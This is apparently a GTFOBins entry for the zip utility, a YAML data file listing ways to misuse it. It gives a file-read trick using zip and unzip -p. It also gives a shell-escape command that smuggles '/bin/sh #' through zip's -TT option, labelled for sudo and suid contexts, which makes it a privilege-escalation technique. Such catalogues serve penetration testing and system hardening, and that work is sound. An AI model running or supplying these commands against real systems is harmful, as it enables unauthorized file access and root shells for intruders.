<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/zip -->
---
functions:
  file-read:
  - code: |-
      zip /path/to/temp-file /path/to/input-file
      unzip -p /path/to/temp-file
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
